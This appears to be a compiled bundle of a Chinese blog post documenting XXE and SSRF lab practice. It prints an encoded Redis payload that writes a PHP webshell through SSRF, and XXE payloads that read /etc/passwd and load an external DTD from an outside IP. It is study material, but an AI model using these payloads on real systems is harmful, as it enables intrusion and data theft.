style="--shiki-light:white;--shiki-dark:#FFFFFF;">252A4</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25246</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Aconfig</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25243</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Aset</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25243</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Adir</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">252413</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">2fvar</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">2fwww</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">2fhtml</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">252A4</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25246</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Aconfig</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25243</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Aset</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">252410</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Adbfilename</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25249</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Ashell</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.php</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">252A1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25244</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Asave</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>拿着payload到pikachu靶场SSRF使用。</p><p>​<img src="'+D+'" alt="image" loading="lazy">​</p></li><li><p>到redis主机web目录查看有没有写成功（真实环境看不了）</p><p><img src="'+w+'" alt="image" loading="lazy">​</p></li><li><p>拿到shell，但不知为何Ant连接不了</p><p>​<img src="'+f+'" alt="image" loading="lazy">​</p></li></ol><h2 id="redis的4中常见攻击方式-★" tabindex="-1"><a class="header-anchor" href="#redis的4中常见攻击方式-★"><span>redis的4中常见攻击方式??★</span></a></h2><p>‍</p><p>‍</p>',35)]))}]]),q=JSON.parse('{"path":"/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/XXE_SSRF.html","title":"XXE&SSRF","lang":"zh-CN","frontmatter":{"title":"XXE&SSRF","index":true,"icon":"e","isOriginal":true,"date":"2023-03-28T00:00:00.000Z","order":4,"category":["渗透测试"],"tag":["渗透测试","XXE&SSRF"],"description":"XXE&SSRF XXE 漏洞复现 XXE读文件 打开xxe_Lab for PHP的靶场，抓包。​image​ 判断是否有XXE注入漏洞 1、判定是否使用了xml进行数据传递 标签、Accept: application/xml, text/xml 2、确定是否有回显位置，或无回显，下图有回显。​ image​ 写入payload。 ​image​ ...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/blog/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/XXE_SSRF.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"XXE&SSRF"}],["meta",{"property":"og:description","content":"XXE&SSRF XXE 漏洞复现 XXE读文件 打开xxe_Lab for PHP的靶场，抓包。​image​ 判断是否有XXE注入漏洞 1、判定是否使用了xml进行数据传递 标签、Accept: application/xml, text/xml 2、确定是否有回显位置，或无回显，下图有回显。​ image​ 写入payload。 ​image​ ..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-12T08:22:33.000Z"}],["meta",{"property":"article:tag","content":"渗透测试"}],["meta",{"property":"article:tag","content":"XXE&SSRF"}],["meta",{"property":"article:published_time","content":"2023-03-28T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-12T08:22:33.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"XXE&SSRF\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-03-28T00:00:00.000Z\\",\\"dateModified\\":\\"2025-01-12T08:22:33.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"]]},"headers":[{"level":2,"title":"XXE","slug":"xxe","link":"#xxe","children":[{"level":3,"title":"漏洞复现","slug":"漏洞复现","link":"#漏洞复现","children":[]}]},{"level":2,"title":"在Kali安装Redis","slug":"在kali安装redis","link":"#在kali安装redis","children":[]},{"level":2,"title":"使用centos7-redis","slug":"使用centos7-redis","link":"#使用centos7-redis","children":[{"level":3,"title":"实验环境","slug":"实验环境","link":"#实验环境","children":[]},{"level":3,"title":"实验步骤","slug":"实验步骤","link":"#实验步骤","children":[]}]},{"level":2,"title":"redis的4中常见攻击方式??★","slug":"redis的4中常见攻击方式-★","link":"#redis的4中常见攻击方式-★","children":[]}],"git":{"createdTime":1736670153000,"updatedTime":1736670153000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":1,"url":"https://github.com/youze"}]},"readingTime":{"minutes":5.39,"words":1618},"filePathRelative":"perm/漏洞专题/XXE&SSRF.md","localizedDate":"2023年3月28日","excerpt":"\\n<h2>XXE</h2>\\n<h3>漏洞复现</h3>\\n<h4>XXE读文件</h4>\\n<ol>\\n<li>\\n<p>打开xxe_Lab for PHP的靶场，抓包。​​</p>\\n</li>\\n<li>\\n<p>判断是否有XXE注入漏洞</p>\\n<p>1、判定是否使用了xml进行数据传递</p>\\n<p>标签、Accept: application/xml, text/xml</p>\\n<p>2、确定是否有回显位置，或无回显，下图有回显。​</p>\\n<p>​</p>\\n</li>\\n<li>\\n<p>写入payload。</p>\\n<div class=\\"language-python line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"python\\" data-title=\\"python\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;</span><span style=\\"--shiki-light:white;--shiki-dark:#FFFFFF\\">?</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">xml version</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\\"1.0\\"</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> encoding</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\\"UTF-8\\"</span><span style=\\"--shiki-light:white;--shiki-dark:#FFFFFF\\">?</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;</span><span style=\\"--shiki-light:white;--shiki-dark:#FFFFFF\\">!</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\">DOCTYPE</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\"> ANY</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">[</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;</span><span style=\\"--shiki-light:white;--shiki-dark:#FFFFFF\\">!</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\">ENTITY</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> a </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\">SYSTEM</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> \\"file:///etc/passwd\\"</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">]</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div><p>​​</p>\\n</li>\\n<li>\\n<p>另一种情况是外部参数实体。</p>\\n<div class=\\"language-python line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"python\\" data-title=\\"python\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;</span><span style=\\"--shiki-light:white;--shiki-dark:#FFFFFF\\">!</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\">ENTITY</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> xxe </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\">SYSTEM</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> \\"file:///etc/passwd\\"</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div></li>\\n<li>\\n<p>http服务</p>\\n<div class=\\"language-bash line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"bash\\" data-title=\\"bash\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;!</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">ENTITY</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> xxe</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> SYSTEM</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> \\"file:///etc/passwd\\"</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div><p>​​</p>\\n<div class=\\"language-python line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"python\\" data-title=\\"python\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;</span><span style=\\"--shiki-light:white;--shiki-dark:#FFFFFF\\">?</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">xml version</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\\"1.0\\"</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> encoding</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\\"UTF-8\\"</span><span style=\\"--shiki-light:white;--shiki-dark:#FFFFFF\\">?</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;</span><span style=\\"--shiki-light:white;--shiki-dark:#FFFFFF\\">!</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\">DOCTYPE</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\"> ANY</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">[</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;</span><span style=\\"--shiki-light:white;--shiki-dark:#FFFFFF\\">!</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\">ENTITY</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\"> %</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> a </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#D19A66\\">SYSTEM</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> \\"http://47.113.187.190:90/wai.dtd\\"</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">%</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">a;</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">]</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">user</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;&lt;</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">username</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&amp;</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">xxe</span><span style=\\"--shiki-light:#000000;--shiki-dark:#FFFFFF\\">;</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;/</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">username</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;&lt;</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">password</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\">222</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&lt;/</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">password</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;&lt;/</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">user</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div></li>\\n<li>\\n<p>​​</p>\\n</li>\\n</ol>","autoDesc":true}')}}]);